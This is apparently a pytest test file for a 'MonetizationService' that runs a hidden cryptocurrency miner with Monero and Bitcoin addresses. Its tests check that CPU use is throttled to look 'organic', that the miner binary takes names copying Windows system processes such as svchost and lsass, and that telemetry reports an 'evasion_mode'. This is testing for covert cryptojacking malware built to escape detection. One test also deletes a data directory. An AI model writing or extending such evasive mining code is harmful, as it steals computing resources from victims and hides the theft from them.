import pytest
import os
import shutil
import time
from backend.core.monetization import MonetizationService, AlienShardProtocol

@pytest.fixture
def monetization():
    service = MonetizationService(xmr_address="test_xmr", btc_address="test_btc")
    yield service
    service.cpu_manager.stop_mining()

def test_organic_cpu_waveform_range(monetization):
    for i in range(100):
        val = AlienShardProtocol.get_organic_cpu_waveform()
        assert 10 <= val <= 85

def test_polymorphic_path_generation(monetization):
    path = monetization.cpu_manager._get_polymorphic_path()
    assert "tools/miner" in path
    assert any(name in path for name in ["svchost", "runtimebroker", "lsass", "spoolsv", "searchindexer"])

def test_secure_telemetry_format(monetization):
    telemetry = monetization.get_secure_telemetry()
    import json
    data = json.loads(telemetry)
    assert "hashrate" in data
    assert "status" in data
    assert "evasion_mode" in data

def test_worker_id_fallback(monetization):
    # Should fallback to Apex-Spartan if no profiles exist
    if os.path.exists("data/profiles"):
        shutil.rmtree("data/profiles")
    assert monetization.cpu_manager._get_worker_id() == "Apex-Spartan"
